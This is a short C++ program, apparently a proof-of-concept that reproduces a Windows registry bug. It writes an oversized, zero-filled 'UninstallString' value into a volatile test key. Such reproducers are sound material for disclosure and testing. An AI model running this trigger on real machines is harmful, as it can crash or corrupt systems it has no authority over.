#include <Windows.h>
#include <cstdio>

int main() {
  LSTATUS st;

  //
  // Create a volatile key for testing.
  //

  HKEY hTestKey;
  st = RegCreateKeyExW(HKEY_CURRENT_USER,
                       L"Test",
                       0,
                       NULL,
                       REG_OPTION_VOLATILE,
                       KEY_ALL_ACCESS,
                       NULL,
                       &hTestKey,
                       NULL);

  if (st != ERROR_SUCCESS) {
    printf("RegCreateKeyExW failed with error %d\n", st);
    return 1;
  }

  //
  // Try to trigger the bug by setting the "UninstallString" value to a long
  // string filled with zeros.
  //

  CONST DWORD kDataSize = 0x1000004;
  PVOID Buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, kDataSize);

  st = RegSetValueExW(hTestKey,
                      L"UninstallString",
                      0,
                      REG_SZ,
                      (const BYTE*)Buffer,
                      kDataSize);

  if (st != ERROR_SUCCESS) {
    printf("RegSetValueExW failed with error %d\n", st);
    return 1;
  }

  printf("Done!\n");

  HeapFree(GetProcessHeap(), 0, Buffer);
  RegCloseKey(hTestKey);

  return 0;
}
